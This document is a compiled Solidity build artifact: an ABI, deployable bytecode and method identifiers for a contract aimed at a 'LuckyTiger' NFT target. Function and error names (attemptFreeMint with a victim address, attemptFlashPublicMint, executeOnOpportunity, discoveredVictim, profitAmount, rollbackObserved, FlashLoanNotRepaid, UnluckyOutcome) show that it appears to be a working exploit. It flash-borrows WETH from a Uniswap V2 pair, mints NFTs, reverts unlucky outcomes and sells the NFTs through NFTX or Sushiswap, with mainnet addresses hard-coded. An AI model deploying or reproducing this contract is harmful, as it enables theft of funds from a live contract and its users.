{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"NFTX_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract INFTXVaultFactoryLike"}],"stateMutability":"view"},{"type":"function","name":"SUSHISWAP_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2FactoryLike"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ILuckyTiger"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2FactoryLike"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_USDC_WETH","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2Pair"}],"stateMutability":"view"},{"type":"function","name":"WETH","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IWETH9"}],"stateMutability":"view"},{"type":"function","name":"attemptFlashPublicMint","inputs":[{"name":"expectedTokenId","type":"uint256","internalType":"uint256"},{"name":"mintPrice","type":"uint256","internalType":"uint256"},{"name":"nftxVault","type":"address","internalType":"address"},{"name":"salePair","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attemptFreeMint","inputs":[{"name":"victim","type":"address","internalType":"address"},{"name":"expectedTokenId","type":"uint256","internalType":"uint256"},{"name":"nftxVault","type":"address","internalType":"address"},{"name":"salePair","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"discoveredVictim","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"mintedTokenId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"onERC721Received","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"pure"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"rollbackObserved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"error","name":"FlashLoanNotRepaid","inputs":[]},{"type":"error","name":"MissingRollbackProof","inputs":[]},{"type":"error","name":"MissingSaleRoute","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"NotSelfCall","inputs":[]},{"type":"error","name":"TokenNotOwned","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"UnexpectedCallbackSender","inputs":[{"name":"sender","type":"address","internalType":"address"}]},{"type":"error","name":"UnexpectedPairCaller","inputs":[{"name":"caller","type":"address","internalType":"address"}]},{"type":"error","name":"UnexpectedSalePair","inputs":[{"name":"pair","type":"address","internalType":"address"}]},{"type":"error","name":"UnluckyOutcome","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]}],"bytecode":{"object":"0x608080604052346015576124b1908161001a8239f35b5f80fdfe6080604052600436101561001a575b3615610018575f80fd5b005b5f3560e01c806310d1e85c14610124578063150b7a021461011f5780633c2448ed1461011a5780633c3ee3c914610115578063463defd11461011057806349343624146100ed578063495c0f9b1461010b5780634f81cd04146101065780635ff972cc146101015780636fcd8b7d146100fc57806372c60172146100f757806399d8fae3146100f2578063ad5c4648146100ed578063c3719bb4146100e8578063cc1f2afa146100e3578063e94a92ca146100de5763fabae3eb0361000e57610948565b610907565b6108e0565b6108bb565b610798565b61088d565b610866565b610838565b61081b565b6107ed565b6107bf565b610776565b61060c565b6105f4565b61058f565b61016c565b6001600160a01b0381160361013a57565b5f80fd5b9181601f8401121561013a5782359167ffffffffffffffff831161013a576020838186019501011161013a57565b3461013a57608036600319011261013a5760043561018981610129565b6044359060643567ffffffffffffffff811161013a576101ad90369060040161013e565b505073b4e16d0168e52d35cacd2c6185b44281ec28c9dc330361057c57306001600160a01b0382160361056157506003546101ec9060101c60ff161590565b6103d357600454905f51602061243c5f395f51905f523b1561013a57604051632e1a7d4d60e01b8152600481018290525f81602481835f51602061243c5f395f51905f525af180156104115761054d575b506005545f51602061245c5f395f51905f523b1561013a575f600491604051928380926326092b8360e01b82525f51602061245c5f395f51905f525af1801561041157610533575b506040516331a9108f60e11b8152600481018390526020816024815f51602061245c5f395f51905f525afa908115610411575f91610504575b50306001600160a01b03909116036104f0576102d982600155565b60405163164457af60e11b8152600481018390526020816024815f51602061245c5f395f51905f525afa908115610411575f916104d1575b5015610457576103289061032361147a565b6114f1565b6040516370a0823160e01b81523060048201529091906020816024815f51602061243c5f395f51905f525afa80156104115783915f91610428575b50106104165760405163a9059cbb60e01b815273b4e16d0168e52d35cacd2c6185b44281ec28c9dc6004820152602481018390526020816044815f5f51602061243c5f395f51905f525af1908115610411575f916103e2575b50156103d35761001862ff00001960035416600355565b633fe269db60e11b5f5260045ffd5b610404915060203d60201161040a575b6103fc8183610979565b8101906109c3565b816103bc565b503d6103f2565b6109a0565b6333b9395760e21b5f5260045260245ffd5b61044a915060203d602011610450575b6104428183610979565b8101906109db565b5f610363565b503d610438565b6006546001600160a01b0316801580156104be575b6104aa5760075461048891906001600160a01b031690846112b7565b1561049657610328906114f1565b6333b9395760e21b5f52600482905260245ffd5b63bab4d8cf60e01b5f52600483905260245ffd5b506007546001600160a01b03161561046c565b6104ea915060203d60201161040a576103fc8183610979565b5f610311565b635b50a3cf60e11b5f52600482905260245ffd5b610526915060203d60201161052c575b61051e8183610979565b8101906109ab565b5f6102be565b503d610514565b806105415f61054793610979565b806105ea565b5f610285565b806105415f61055b93610979565b5f61023d565b63675265af60e01b5f526001600160a01b031660045260245ffd5b6385d6e2eb60e01b5f523360045260245ffd5b3461013a57608036600319011261013a576105ab600435610129565b6105b6602435610129565b60643567ffffffffffffffff811161013a576105d690369060040161013e565b5050604051630a85bd0160e11b8152602090f35b5f91031261013a57565b3461013a575f36600319011261013a57610018610a6c565b3461013a57608036600319011261013a5760443560243560043561062f83610129565b6064359061063c82610129565b303303610767576106bd6106df9261069b6106d1966106676201000062ff0000196003541617600355565b61067085600455565b61067987600555565b60018060a01b03166bffffffffffffffffffffffff60a01b6006541617600655565b60018060a01b03166bffffffffffffffffffffffff60a01b6007541617600755565b604051938491602083019190602083019252565b03601f198101845283610979565b73b4e16d0168e52d35cacd2c6185b44281ec28c9dc3b1561013a5760405163022c0d9f60e01b8152915f918391829161071e9190309060048501610f56565b03818373b4e16d0168e52d35cacd2c6185b44281ec28c9dc5af1801561041157610753575b5060035460101c60ff166103d357005b806105415f61076193610979565b5f610743565b63763e6e0560e11b5f5260045ffd5b3461013a575f36600319011261013a57602060ff600354166040519015158152f35b3461013a575f36600319011261013a5760206040515f51602061243c5f395f51905f528152f35b3461013a575f36600319011261013a57602060405173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac8152f35b3461013a575f36600319011261013a57602060405173be86f647b167567525ccaafcd6f881f1ee5582168152f35b3461013a575f36600319011261013a576020600254604051908152f35b3461013a575f36600319011261013a57602060405173b4e16d0168e52d35cacd2c6185b44281ec28c9dc8152f35b3461013a575f36600319011261013a575f546040516001600160a01b039091168152602090f35b3461013a575f36600319011261013a576020604051735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f8152f35b3461013a575f36600319011261013a57602060ff60035460081c166040519015158152f35b3461013a575f36600319011261013a5760206040515f51602061245c5f395f51905f528152f35b3461013a57608036600319011261013a5761001860043561092781610129565b60443560243561093682610129565b6064359261094384610129565b610f80565b3461013a575f36600319011261013a576020600154604051908152f35b634e487b7160e01b5f52604160045260245ffd5b90601f8019910116810190811067ffffffffffffffff82111761099b57604052565b610965565b6040513d5f823e3d90fd5b9081602091031261013a57516109c081610129565b90565b9081602091031261013a5751801515810361013a5790565b9081602091031261013a575190565b634e487b7160e01b5f52601160045260245ffd5b9060018201809211610a0c57565b6109ea565b90610a1f6040519283610979565b565b67ffffffffffffffff811161099b57601f01601f191660200190565b3d15610a67573d90610a4e82610a21565b91610a5c6040519384610979565b82523d5f602084013e565b606090565b60405163cd85cdb560e01b81526020816004815f51602061245c5f395f51905f525afa908115610411575f91610f13575b50610a1f576040516318160ddd60e01b81526020816004815f51602061245c5f395f51905f525afa908115610411575f91610ef4575b506040516332471e1360e11b81526020816004815f51602061245c5f395f51905f525afa908115610411575f91610ed5575b50811015610ed257610b15611527565b906001600160a01b038216610ec3575f915b6040516370a0823160e01b8152306004820152916020836024815f51602061243c5f395f51905f525afa928315610411575f93610ea2575b50610b6981611767565b5f80546001600160a01b0319166001600160a01b038316179055906001600160a01b038216610d86575b50506040516318160ddd60e01b8152926020846004815f51602061245c5f395f51905f525afa938415610411575f94610d65575b50610bd1846109fe565b60405163501ad8ff60e11b815290926020826004815f51602061245c5f395f51905f525afa918215610411575f92610d44575b50303b1561013a57604051633c3ee3c960e01b81526004810185905260248101929092526001600160a01b0390811660448301529190911660648201525f8160848183305af19081610d30575b50610caa575050610c68610c63610a3d565b6119ad565b610c7b576328fbb9c960e21b5f5260045ffd5b610c8490611aac565b610c9861010061ff00196003541617600355565b610a1f600160ff196003541617600355565b610cc7919250610cc2600160ff196003541617600355565b600155565b6040516370a0823160e01b81523060048201526020816024815f51602061243c5f395f51905f525afa91821561041157610a1f92610d0c925f91610d11575b50611992565b600255565b610d2a915060203d602011610450576104428183610979565b5f610d06565b806105415f610d3e93610979565b5f610c51565b610d5e91925060203d602011610450576104428183610979565b905f610c04565b610d7f91945060203d602011610450576104428183610979565b925f610bc7565b6040516318160ddd60e01b81526020816004815f51602061245c5f395f51905f525afa801561041157610dc0915f91610e83575b506109fe565b303b1561013a576040516374a5496560e11b81526001600160a01b038481166004830152602482018390528581166044830152871660648201525f8160848183305af19081610e6f575b50610e535750610e1b610c63610a3d565b15610e4457610e29916119ec565b610e3d61010061ff00196003541617600355565b5f80610b93565b6328fbb9c960e21b5f5260045ffd5b92505050610cc7919250610cc2600160ff196003541617600355565b806105415f610e7d93610979565b5f610e0a565b610e9c915060203d602011610450576104428183610979565b5f610dba565b610ebc91935060203d602011610450576104428183610979565b915f610b5f565b610ecc826115eb565b91610b27565b50565b610eee915060203d602011610450576104428183610979565b5f610b05565b610f0d915060203d602011610450576104428183610979565b5f610ad3565b610f2c915060203d60201161040a576103fc8183610979565b5f610a9d565b805180835260209291819084018484015e5f828201840152601f01601f1916010190565b6109c093926080925f8352602083015260018060a01b031660408201528160608201520190610f32565b91929092303303610767576040516370a0823160e01b8152306004820152926020846024815f51602061243c5f395f51905f525afa938415610411575f946111ca575b505f51602061245c5f395f51905f523b1561013a5760405163fa07ce1d60e01b81526001600160a01b039190911660048201525f81602481835f51602061245c5f395f51905f525af18015610411576111b6575b506040516331a9108f60e11b8152600481018590526020816024815f51602061245c5f395f51905f525afa908115610411575f91611197575b50306001600160a01b03909116036111835760405163164457af60e11b8152600481018590526020816024815f51602061245c5f395f51905f525afa908115610411575f91611164575b50611158576001600160a01b038116158015611147575b61113357906110c091846112b7565b159081156110d1575b506104165750565b6040516370a0823160e01b81523060048201529091506020816024815f51602061243c5f395f51905f525afa908115610411575f91611114575b5011155f6110c9565b61112d915060203d602011610450576104428183610979565b5f61110b565b63bab4d8cf60e01b5f52600484905260245ffd5b506001600160a01b038216156110b1565b50505050610a1f61147a565b61117d915060203d60201161040a576103fc8183610979565b5f61109a565b635b50a3cf60e11b5f52600484905260245ffd5b6111b0915060203d60201161052c5761051e8183610979565b5f611050565b806105415f6111c493610979565b5f611017565b6111e491945060203d602011610450576104428183610979565b925f610fc3565b67ffffffffffffffff811161099b5760051b60200190565b604080519091906112148382610979565b6001815291601f1901366020840137565b634e487b7160e01b5f52603260045260245ffd5b8051156112465760200190565b611225565b80518210156112465760209160051b010190565b90602080835192838152019201905f5b81811061127c5750505090565b825184526020938401939092019160010161126f565b90916112a96109c09360408452604084019061125f565b91602081840391015261125f565b92915f51602061245c5f395f51905f523b1561013a5760405163095ea7b360e01b81526001600160a01b0383166004820152602481018590525f81604481835f51602061245c5f395f51905f525af1801561041157611466575b5061131a611203565b8461132482611239565b5261132d611203565b90600161133983611239565b526040516370a0823160e01b81523060048201526001600160a01b038516929091602083602481875afa928315610411575f9361143e575b50604051630f57464360e21b81529160209183918291611395919060048401611292565b03815f875af19081611421575b506113bb576333b9395760e21b5f52600486905260245ffd5b6040516370a0823160e01b815230600482015291602090839060249082905afa8015610411576113f1925f91610d115750611992565b91821561140d57906114039291611b97565b9182156104165750565b6333b9395760e21b5f52600485905260245ffd5b6114399060203d602011610450576104428183610979565b6113a2565b60209193509161145d61139593833d8511610450576104428183610979565b93915091611371565b806105415f61147493610979565b5f611311565b47806114835750565b5f51602061243c5f395f51905f523b1561013a575f60049160405192838092630d0e30db60e41b82525f51602061243c5f395f51905f525af18015610411576114c95750565b5f610a1f91610979565b81156114dd570490565b634e487b7160e01b5f52601260045260245ffd5b6103e88102908082046103e81490151715610a0c576103e5900460018101809111610a0c5790565b5f198114610a0c5760010190565b6040516304c94c4160e31b815260208160048173be86f647b167567525ccaafcd6f881f1ee5582165afa5f91816115ca575b5061156357505f90565b60015b818111156115a457505f5b81811061157e5750505f90565b61158781611ed0565b6001600160a01b03811661159e5750600101611571565b91505090565b6115ad81611ed0565b6001600160a01b03811661159e57506115c590611519565b611566565b6115e491925060203d602011610450576104428183610979565b905f611559565b60405163e6a4390560e01b81526001600160a01b03821660048201525f51602061243c5f395f51905f52602482015260208160448173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac5afa908115610411576116519183915f91611705575b50611fb3565b60405163e6a4390560e01b81526001600160a01b03831660048201525f51602061243c5f395f51905f526024820152909190602081604481735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f5afa908115610411576116b99183915f916117055750611fb3565b906001600160a01b038316156116ff576001600160a01b038216156116fa576116ec6116e58285612170565b9183612170565b116116f5575090565b905090565b505090565b50905090565b61171e915060203d60201161052c5761051e8183610979565b5f61164b565b9060048110156112465760051b0190565b9061173f826111eb565b61174c6040519182610979565b828152809261175d601f19916111eb565b0190602036910137565b6117716080610a11565b604051638da5cb5b60e01b81526020816004815f51602061245c5f395f51905f525afa8015610411576117b3915f91611973575b506001600160a01b03168252565b604051620ac0db60e91b81526020816004815f51602061245c5f395f51905f525afa8015610411576117f7915f91611954575b506001600160a01b03166020830152565b5f51602061245c5f395f51905f5260408201523060608201525f5b6004811061191857505061182581611735565b5f60015b8381111561183957505050505f90565b6040516331a9108f60e11b8152600481018290526020816024815f51602061245c5f395f51905f525afa5f91816118f8575b5061187f575061187a90611519565b611829565b916001600160a01b0383161580156118e7575b6118dc57806118b7846118a86118bc948861124b565b6001600160a01b039091169052565b611519565b916118c68161230c565b6118d4575061187a90611519565b935050505090565b915061187a90611519565b506118f3838286612377565b611892565b61191191925060203d811161052c5761051e8183610979565b905f61186b565b61193a6119356119288385611724565b516001600160a01b031690565b61230c565b61194657600101611812565b6109c0925061192891611724565b61196d915060203d60201161052c5761051e8183610979565b5f6117e6565b61198c915060203d60201161052c5761051e8183610979565b5f6117a5565b90808211156119a7578103908111610a0c5790565b50505f90565b60048151106119e757602001516001600160e01b0319166333b9395760e21b81149081156119d9575090565b63bab4d8cf60e01b14919050565b505f90565b906040516318160ddd60e01b81526020816004815f51602061245c5f395f51905f525afa908115610411575f91611a8d575b5003610e445760405163f99031a760e01b81526001600160a01b039190911660048201526020816024815f51602061245c5f395f51905f525afa908115610411575f91611a6e575b5015610e4457565b611a87915060203d60201161040a576103fc8183610979565b5f611a66565b611aa6915060203d602011610450576104428183610979565b5f611a1e565b6040516318160ddd60e01b81526020816004815f51602061245c5f395f51905f525afa908115610411575f91611ae5575b5003610e4457565b611afe915060203d602011610450576104428183610979565b5f611add565b51906001600160701b038216820361013a57565b9081606091031261013a57611b2c81611b04565b916040611b3b60208401611b04565b92015163ffffffff8116810361013a5790565b60405190611b5d602083610979565b5f808352366020840137565b9081525f60208201526001600160a01b0390911660408201526080606082018190526109c092910190610f32565b604051630240bc6b60e21b8152939192906001600160a01b03841690606086600481855afa8015610411575f965f91611e9a575b50604051630dfe168160e01b815291602083600481875afa928315610411575f93611e79575b5060405163d21220a760e01b815290602082600481885afa918215610411575f92611e58575b506001600160a01b0390811693169081841480611e39575b611d78576001600160a01b031683149081611d61575b50611c655762c2617160e21b5f526001600160a01b03861660045260245ffd5b6001600160701b0380611c80939597949698169116866123bf565b938415611d585760405163a9059cbb60e01b81526001600160a01b03929092166004830152602482015290602090829060449082905f905af1908115610411575f91611d39575b5015611d2457611cd5611b4e565b90803b1561013a5760405163022c0d9f60e01b8152915f918391829084908290611d0490308a60048501611b69565b03925af1801561041157611d16575090565b806105415f6109c093610979565b6001546333b9395760e21b5f5260045260245ffd5b611d52915060203d60201161040a576103fc8183610979565b5f611cc7565b50505050505f90565b5f51602061243c5f395f51905f529150145f611c45565b5050956001600160701b0380611d96939597949698169116866123bf565b938415611d585760405163a9059cbb60e01b81526001600160a01b03929092166004830152602482015290602090829060449082905f905af1908115610411575f91611e1a575b5015611d2457611deb611b4e565b90803b1561013a5760405163022c0d9f60e01b8152915f918391829084908290611d0490308a60048501610f56565b611e33915060203d60201161040a576103fc8183610979565b5f611ddd565b506001600160a01b0381165f51602061243c5f395f51905f5214611c2f565b611e7291925060203d60201161052c5761051e8183610979565b905f611c17565b611e9391935060203d60201161052c5761051e8183610979565b915f611bf1565b9050611ebf91965060603d606011611ec9575b611eb78183610979565b810190611b18565b509590955f611bcb565b503d611ead565b6040516340d1b7db60e11b8152600481019190915260208160248173be86f647b167567525ccaafcd6f881f1ee5582165afa5f9181611f92575b50611f1457505f90565b6001600160a01b03811680156119a757602060049160405192838092631ba46cfd60e01b82525afa5f9181611f71575b50611f4f5750505f90565b6001600160a01b03165f51602061245c5f395f51905f52146109c057806119a7565b611f8b91925060203d60201161052c5761051e8183610979565b905f611f44565b611fac91925060203d60201161052c5761051e8183610979565b905f611f0a565b906001600160a01b03821690811561216957604051630dfe168160e01b8152602081600481865afa5f9181612148575b50611ff057505050505f90565b60405163d21220a760e01b81529290602084600481855afa5f9481612127575b5061201e5750505050505f90565b60606004949260405195868092630240bc6b60e21b82525afa93845f915f96612103575b50612051575050505050505f90565b93926001600160a01b03918216911681811492836120e3575b83156120b1575b5050501591821561209f575b50811561208d575b506119e75790565b6001600160701b03915016155f612085565b6001600160701b03161591505f61207d565b6001600160a01b0316149150816120cc575b505f8080612071565b5f51602061243c5f395f51905f529150145f6120c3565b6001600160a01b0381165f51602061243c5f395f51905f5214935061206a565b90955061211f915060603d606011611ec957611eb78183610979565b50945f612042565b61214191955060203d60201161052c5761051e8183610979565b935f612010565b61216291925060203d60201161052c5761051e8183610979565b905f611fe3565b5050505f90565b604051630240bc6b60e21b8152916001600160a01b039190911690606083600481855afa918215610411575f935f936122e4575b50604051630dfe168160e01b815291602083600481855afa918215610411576004935f936122c2575b506020906040519485809263d21220a760e01b82525afa928315610411575f936122a1575b506001600160a01b039182169291169082821480612282575b612260576001600160a01b0316149081612249575b5061222b5750505f90565b6001600160701b03806109c093169116670de0b6b3a76400006123bf565b5f51602061243c5f395f51905f529150145f612220565b505050906001600160701b03806109c093169116670de0b6b3a76400006123bf565b506001600160a01b0381165f51602061243c5f395f51905f521461220b565b6122bb91935060203d60201161052c5761051e8183610979565b915f6121f2565b60209193506122dd90823d841161052c5761051e8183610979565b92906121cd565b90925061230191935060603d606011611ec957611eb78183610979565b50929092915f6121a4565b6001600160a01b03168015159081612322575090565b90506040519063f99031a760e01b825260048201526020816024815f51602061245c5f395f51905f525afa908115610411575f9161235e575090565b6109c0915060203d60201161040a576103fc8183610979565b9190915f5b83811061238b57505050505f90565b6001600160a01b0361239d828461124b565b51166001600160a01b038416146123b65760010161237c565b50505050600190565b801590818015612433575b801561242b575b612423576103e58102918183046103e5141715610a0c57836103e5910202928184041481151715610a0c576103e88202918083046103e81490151715610a0c578101809111610a0c576109c0916114d3565b505050505f90565b5083156123d1565b5082156123ca56fe000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000009c87a5726e98f2f404cdd8ac8968e9b2c80c0967a2646970667358221220b684750b622103fbee6878802a347aaf35e1b0dd89e367fe3faf2685bbf9141d64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"NFTX_FACTORY()":"4f81cd04","SUSHISWAP_FACTORY()":"495c0f9b","TARGET()":"cc1f2afa","UNISWAP_V2_FACTORY()":"99d8fae3","UNISWAP_V2_USDC_WETH()":"6fcd8b7d","WETH()":"ad5c4648","attemptFlashPublicMint(uint256,uint256,address,address)":"3c3ee3c9","attemptFreeMint(address,uint256,address,address)":"e94a92ca","discoveredVictim()":"72c60172","executeOnOpportunity()":"3c2448ed","hypothesisValidated()":"463defd1","mintedTokenId()":"fabae3eb","onERC721Received(address,address,uint256,bytes)":"150b7a02","profitAmount()":"5ff972cc","profitToken()":"49343624","rollbackObserved()":"c3719bb4","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}